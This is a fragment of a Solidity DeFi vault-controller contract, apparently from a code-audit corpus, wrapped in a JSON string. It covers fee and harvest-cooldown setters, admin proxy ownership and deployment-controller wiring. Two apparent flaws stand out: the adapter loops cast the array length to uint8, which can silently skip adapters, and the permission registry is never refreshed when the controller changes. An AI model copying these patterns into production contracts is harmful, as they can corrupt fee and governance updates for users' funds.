}\n\n  /// @notice Verify that the adapter configuration is valid.\n  function _verifyAdapterConfiguration(address adapter, bytes32 adapterId) internal view {\n    if (adapter != address(0)) {\n      if (adapterId > 0) revert AdapterConfigFaulty();\n      if (!cloneRegistry.cloneExists(adapter)) revert AdapterConfigFaulty();\n    }\n  }\n\n  /// @notice Verify that the array lengths are equal.\n  function _verifyEqualArrayLength(uint256 length1, uint256 length2) internal pure {\n    if (length1 != length2) revert ArrayLengthMissmatch();\n  }\n\n  modifier canCreate() {\n    if (\n      permissionRegistry.endorsed(address(1))\n        ? !permissionRegistry.endorsed(msg.sender)\n        : permissionRegistry.rejected(msg.sender)\n    ) revert NotAllowed(msg.sender);\n    _;\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          OWNERSHIP LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  IAdminProxy public adminProxy;\n\n  /**\n   * @notice Nominates a new owner of `AdminProxy`. Caller must be owner.\n   * @dev Must be called if the `VaultController` gets swapped out or upgraded\n   */\n  function nominateNewAdminProxyOwner(address newOwner) external onlyOwner {\n    adminProxy.nominateNewOwner(newOwner);\n  }\n\n  /**\n   * @notice Accepts ownership of `AdminProxy`. Caller must be nominated owner.\n   * @dev Must be called after construction\n   */\n  function acceptAdminProxyOwnership() external {\n    adminProxy.acceptOwnership();\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          MANAGEMENT FEE LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  uint256 public performanceFee;\n\n  event PerformanceFeeChanged(uint256 oldFee, uint256 newFee);\n\n  error InvalidPerformanceFee(uint256 fee);\n\n  /**\n   * @notice Set a new performanceFee for all new adapters. Caller must be owner.\n   * @param newFee performance fee in 1e18.\n   * @dev Fees can be 0 but never more than 2e17 (1e18 = 100%, 1e14 = 1 BPS)\n   * @dev Can be retroactively applied to existing adapters.\n   */\n  function setPerformanceFee(uint256 newFee) external onlyOwner {\n    // Dont take more than 20% performanceFee\n    if (newFee > 2e17) revert InvalidPerformanceFee(newFee);\n\n    emit PerformanceFeeChanged(performanceFee, newFee);\n\n    performanceFee = newFee;\n  }\n\n  /**\n   * @notice Set a new performanceFee for existing adapters. Caller must be owner.\n   * @param adapters array of adapters to set the management fee for.\n   */\n  function setAdapterPerformanceFees(address[] calldata adapters) external onlyOwner {\n    uint8 len = uint8(adapters.length);\n    for (uint256 i = 0; i < len; i++) {\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        adapters[i],\n        abi.encodeWithSelector(IAdapter.setPerformanceFee.selector, performanceFee)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          HARVEST COOLDOWN LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  uint256 public harvestCooldown;\n\n  event HarvestCooldownChanged(uint256 oldCooldown, uint256 newCooldown);\n\n  error InvalidHarvestCooldown(uint256 cooldown);\n\n  /**\n   * @notice Set a new harvestCooldown for all new adapters. Caller must be owner.\n   * @param newCooldown Time in seconds that must pass before a harvest can be called again.\n   * @dev Cant be longer than 1 day.\n   * @dev Can be retroactively applied to existing adapters.\n   */\n  function setHarvestCooldown(uint256 newCooldown) external onlyOwner {\n    // Dont wait more than X seconds\n    if (newCooldown > 1 days) revert InvalidHarvestCooldown(newCooldown);\n\n    emit HarvestCooldownChanged(harvestCooldown, newCooldown);\n\n    harvestCooldown = newCooldown;\n  }\n\n  /**\n   * @notice Set a new harvestCooldown for existing adapters. Caller must be owner.\n   * @param adapters Array of adapters to set the cooldown for.\n   */\n  function setAdapterHarvestCooldowns(address[] calldata adapters) external onlyOwner {\n    uint8 len = uint8(adapters.length);\n    for (uint256 i = 0; i < len; i++) {\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        adapters[i],\n        abi.encodeWithSelector(IAdapter.setHarvestCooldown.selector, harvestCooldown)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                      DEPLYOMENT CONTROLLER LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  IDeploymentController public deploymentController;\n  ICloneRegistry public cloneRegistry;\n  ITemplateRegistry public templateRegistry;\n  IPermissionRegistry public permissionRegistry;\n\n  event DeploymentControllerChanged(address oldController, address newController);\n\n  error InvalidDeploymentController(address deploymentController);\n\n  /**\n   * @notice Sets a new `DeploymentController` and saves its auxilary contracts. Caller must be owner.\n   * @param _deploymentController New DeploymentController.\n   */\n  function setDeploymentController(IDeploymentController _deploymentController) external onlyOwner {\n    _setDeploymentController(_deploymentController);\n  }\n\n  function _setDeploymentController(IDeploymentController _deploymentController) internal {\n    if (address(_deploymentController) == address(0) || address(deploymentController) == address(_deploymentController))\n      revert InvalidDeploymentController(address(_deploymentController));\n\n    emit DeploymentControllerChanged(address(deploymentController), address(_deploymentController));\n\n    deploymentController = _deploymentController;\n    cloneRegistry = _deploymentController.cloneRegistry();\n    templateRegistry = _deploymentController.templateRegistry();\n  }\n\n  /*//////////////////////////////////////////////////////////////"
    }
  ]
}